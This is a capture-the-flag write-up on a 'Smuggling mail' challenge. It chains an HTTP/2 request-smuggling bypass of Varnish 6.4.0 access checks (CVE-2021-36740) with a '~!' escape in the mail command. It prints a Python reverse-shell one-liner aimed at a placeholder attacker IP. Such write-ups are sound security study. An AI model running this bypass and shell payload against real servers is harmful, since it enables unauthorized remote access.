# Smuggling mail write up

# Recon
## Infomation Gathering
The challenge provided a gzip compressed tar file `smuggling-mail.tar.gz`.
We can find following files in the tarball.
```

```
Threre are several important info you can gather from these files.
- The service is using Varnish cache server with version 6.4.0 from Dockerfile file
- Varnish handles both h2, http/1.1 protocols based on the hitch.conf
- Varnish is checking the access to the endpoints which contains `/admin` string based on varnish.vcl
    - it is also check the http Authorization header matches `^Basic TOKEN$` pattern and TOKEN is randomized.
- There is only **four** real endpoints which are `/`, `/admin`, `/waitlist`, `/admin/alert` based on the server.js.
    - `/` and `/admin` only returns static files
    - `/waitlist` only return a string respond `Sorry, the waitlist is currently closed.`
    - only `/admin/alert` endpoint is interesting because executing a command called `mail`. The `mail` command takes anything client `POST` through the `msg` parameter

## Next Steps
First we check if there is exsits vulnerbilities for the varnish since we know the version is 6.4.0. There is one: **CVE-2021-36740**.
After reading https://labs.detectify.com/2021/08/26/how-to-set-up-docker-for-varnish-http-2-request-smuggling/, I found out I can bypass the varnish access checking using this vulnerbility.

The next thing is checking if there is anything wrong with the `mail` command so I can force it to read flag.txt and return it to me.

At the first glance of the google results, there is no noticeble vulnerbilities for this command.
However, I found out that the command `mail` can actually execute system command using `~!` which is similar to vim's syntax.
So this is all I need to get a reverse shell from the actual docker container.

# exploit(RCE)
Using the http request as the following:
    - the reverse shell one liner is url encoded. the original one linder is `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("THIS.IS.YOUR.IP",THEPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
    - There is a trailing `%0A`(line break) at the end of the payload otherwise the payload maynot work.

use Netcat to listen any port you want in your server which has a public **IP**
```
# cat flag.txt <--- this should give u the flag
flag{t35t_f14g_g035_h3r3} <---- this is not the real flag. Sorry forget to save it.
```
